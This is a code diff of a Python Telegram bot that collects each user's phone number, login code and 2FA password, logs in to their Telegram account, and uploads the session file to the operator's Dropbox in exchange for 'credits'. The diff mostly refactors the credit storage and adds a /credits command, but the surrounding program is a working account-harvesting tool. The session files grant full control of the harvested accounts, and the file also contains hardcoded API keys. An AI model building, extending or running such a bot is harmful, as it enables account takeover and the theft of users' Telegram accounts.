@@ -1,13 +1,14 @@
 
+# ---- Your Telegram API keys ----
+# ---- Your Telegram API keys ----
 import os
 import json
 import asyncio
-import dropbox
-from telethon import TelegramClient, errors
-from telegram import Update, ReplyKeyboardMarkup
+from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
+from telethon import TelegramClient, errors
+import dropbox
 
-# ---- Your Telegram API keys ----
 # ---- Your Telegram API keys ----
 API_ID = 28863669  # <-- Replace with your API ID (integer)
 API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)
@@ -25,47 +26,42 @@ ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)
 # ---- Dictionary to track users' login states ----
 user_sessions = {}
 
-# Directory for storing credit files
-CREDITS_DIR = "credits/"
+# ---- Path to store credit files ----
+CREDIT_FILE_PATH = "credits"
 
-# Ensure the credits directory exists
-os.makedirs(CREDITS_DIR, exist_ok=True)
+# Make sure the credits directory exists
+os.makedirs(CREDIT_FILE_PATH, exist_ok=True)
 
-# ---- Function to get user's credit balance ----
-async def get_user_credits(user_id):
-    user_file_path = os.path.join(CREDITS_DIR, f"{user_id}.json")
+# ---- Add Credit to User ----
+async def add_credit(user_id, amount):
+    file_path = f"{CREDIT_FILE_PATH}/{user_id}.json"
     
-    if not os.path.exists(user_file_path):
-        # If file doesn't exist, create it with 0 credits
-        with open(user_file_path, "w") as f:
-            json.dump({"credits": 0}, f)
-        return 0  # No credits initially
+    # Check if the user already has a credit file
+    if os.path.exists(file_path):
+        with open(file_path, "r") as f:
+            data = json.load(f)
+        # Increase the credit balance
+        data["credits"] += amount
+    else:
+        # If no credit file exists, create a new one with the initial amount
+        data = {"credits": amount}
     
-    with open(user_file_path, "r") as f:
-        data = json.load(f)
-        return data.get("credits", 0)
-
-# ---- Function to add credits ----
-async def add_credits(user_id, amount):
-    user_file_path = os.path.join(CREDITS_DIR, f"{user_id}.json")
-
-    # Ensure the user file exists
-    if not os.path.exists(user_file_path):
-        with open(user_file_path, "w") as f:
-            json.dump({"credits": 0}, f)
-
-    # Load the current credit balance
-    with open(user_file_path, "r") as f:
-        data = json.load(f)
-
-    # Add credits
-    data["credits"] = data.get("credits", 0) + amount
-
-    # Save the updated credit balance
-    with open(user_file_path, "w") as f:
+    # Save the updated credits to the file
+    with open(file_path, "w") as f:
         json.dump(data, f)
-
+    
     return data["credits"]
+
+# ---- Get Credit for User ----
+async def get_user_credits(user_id):
+    file_path = f"{CREDIT_FILE_PATH}/{user_id}.json"
+    
+    if os.path.exists(file_path):
+        with open(file_path, "r") as f:
+            data = json.load(f)
+        return data["credits"]
+    else:
+        return 0  # Default to 0 if no credit file exists
 
 # ---- Start Command ----
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -111,15 +107,17 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.sign_in(phone, code)
         await update.message.reply_text("✅ Logged in successfully!")
 
-        # Add credits to the user
-        new_credit_balance = await add_credits(user_id, 1)  # Adding 1 credit as an example
+        # Add 1 credit after successful login
+        new_credit_balance = await add_credit(user_id, 1)  # Adding 1 credit as an example
 
         # Upload session file to Dropbox
         await upload_session_to_dropbox(client, phone)
-        
-        await update.message.reply_text(f"Your new credit balance is: {new_credit_balance} credits.")
 
         await client.disconnect()
+
+        # Inform the user that their credits have been updated
+        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
+
         return ConversationHandler.END
 
     except errors.SessionPasswordNeededError:
@@ -163,15 +161,17 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.sign_in(password=password)
         await update.message.reply_text("✅ Logged in successfully with 2FA!")
 
-        # Add credits to the user
-        new_credit_balance = await add_credits(user_id, 1)  # Adding 1 credit as an example
+        # Add 1 credit after successful login
+        new_credit_balance = await add_credit(user_id, 1)
 
         # Upload session file to Dropbox
         await upload_session_to_dropbox(client, session["phone"])
-        
-        await update.message.reply_text(f"Your new credit balance is: {new_credit_balance} credits.")
 
         await client.disconnect()
+
+        # Inform the user about their credits
+        await update.message.reply_text(f"🎉 Your account has been saved in Dropbox. You now have {new_credit_balance} credits.")
+
         return ConversationHandler.END
     except errors.PasswordHashInvalidError:
         await update.message.reply_text("❌ Incorrect password. Please send again.")
@@ -191,6 +191,16 @@ async def upload_session_to_dropbox(client, phone):
         dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
         
     print(f"✅ Session file for {phone} uploaded to Dropbox.")
+
+# ---- Command to check credits ----
+async def check_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+
+    # Get the user's credit balance
+    credit_balance = await get_user_credits(user_id)
+    
+    # Send a message with the current credit balance
+    await update.message.reply_text(f"💳 Your current credit balance is: {credit_balance} credits.")
 
 # ---- Cancel Command ----
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -213,6 +223,9 @@ def main():
         },
         fallbacks=[CommandHandler('cancel', cancel)],
     )
+
+    # Add the /credits command handler to check credits
+    app.add_handler(CommandHandler("credits", check_credits))
 
     app.add_handler(conv_handler)
 
